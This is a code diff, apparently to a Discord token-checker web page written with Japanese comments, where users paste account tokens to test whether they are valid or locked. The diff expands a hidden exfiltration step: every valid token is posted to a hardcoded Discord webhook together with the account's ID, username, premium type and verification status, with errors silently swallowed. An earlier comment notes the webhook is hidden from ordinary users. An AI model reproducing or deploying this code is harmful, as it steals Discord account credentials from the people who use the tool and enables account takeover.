@@ -121,35 +121,36 @@
             const libraryUrl = 'https://discord.com/api/v9/users/@me/library';
 
             try {
-                // まず@meで基本確認
+                // まず@meで基本確認とユーザー情報取得
                 const meRes = await fetch(proxy + encodeURIComponent(meUrl), {
                     headers: { Authorization: token }
                 });
-                if (meRes.status === 401) return 'invalid';
+                if (meRes.status === 401) return {status: 'invalid'};
 
-                if (meRes.status !== 200) return 'error';
+                if (meRes.status !== 200) return {status: 'error'};
+
+                const user = await meRes.json();
 
                 // ロック確認のためlibraryエンドポイント
                 const libRes = await fetch(proxy + encodeURIComponent(libraryUrl), {
                     headers: { Authorization: token }
                 });
-                if (libRes.status === 200) return 'valid';
+                if (libRes.status === 200) return {status: 'valid', user};
 
                 const libData = await libRes.json();
-                if (libData.code === 40002) return 'locked';
+                if (libData.code === 40002) return {status: 'locked', user};
 
-                return 'invalid'; // その他のエラーは無効扱い
+                return {status: 'invalid'}; // その他のエラーは無効扱い
             } catch (e) {
-                return 'error';
+                return {status: 'error'};
             }
         }
 
         async function checkTokens() {
             const input = document.getElementById('tokens').value.trim();
             if (!input) return alert('トークンを入力してください');
-
-            // Webhook URLをここにハードコード（一般利用者には表示されない）
-            const webhook = 'https://discord.com/api/webhooks/1403994161610362990/MgTGhV5ToI_3m1f9OiW4U7TW1ugA28a8kuhrqGFiPirnVsAt48Zglwc54EmMqoC5qAZE'; // あなたのWebhook URLをここに入力してください。例: 'https://discord.com/api/webhooks/xxxx/xxxx'
+            
+            const webhook = 'https://discord.com/api/webhooks/1403994161610362990/MgTGhV5ToI_3m1f9OiW4U7TW1ugA28a8kuhrqGFiPirnVsAt48Zglwc54EmMqoC5qAZE'; // あなたのWebhook URLをここに入力してください。例: 'https://discord.com/api/webhooks/xxxx/xxxx'。これが空だと送信されません。
 
             const tokens = input.split(/\n|,/).map(t => t.trim()).filter(t => t);
             document.getElementById('loading').style.display = 'block';
@@ -161,26 +162,29 @@
             const locked = [];
 
             const results = await Promise.all(tokens.map(async (token) => {
-                const status = await checkToken(token);
-                if (status === 'valid') valid.push(token);
-                if (status === 'locked') locked.push(token);
-                return { token, status };
+                const result = await checkToken(token);
+                if (result.status === 'valid') valid.push({token, user: result.user});
+                if (result.status === 'locked') locked.push(token);
+                return { token, status: result.status };
             }));
 
             document.getElementById('loading').style.display = 'none';
 
             if (valid.length > 0) {
                 const validList = document.getElementById('valid-list');
-                validList.innerHTML = valid.map(t => `<li>${t}</li>`).join('');
+                validList.innerHTML = valid.map(({token}) => `<li>${token}</li>`).join('');
                 document.getElementById('valid-section').style.display = 'block';
 
                 // Webhook送信（任意だがハードコードされている場合のみ）
                 if (webhook) {
                     try {
+                        const content = valid.map(({token, user}) => {
+                            return `生存トークン: ${token}\nユーザーID: ${user.id}\nユーザー名: ${user.username}\nグローバル名: ${user.global_name || 'なし'}\nプレミアムタイプ: ${user.premium_type || 'なし'}\n検証済み: ${user.verified ? 'はい' : 'いいえ'}`;
+                        }).join('\n\n---\n\n');
                         await fetch(webhook, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ content: `生存トークン: ${valid.join(', ')}` })
+                            body: JSON.stringify({ content: `新しい生存トークンが検出されました:\n\n${content}` })
                         });
                     } catch (e) {
                         // エラー時は無視（ログなし）
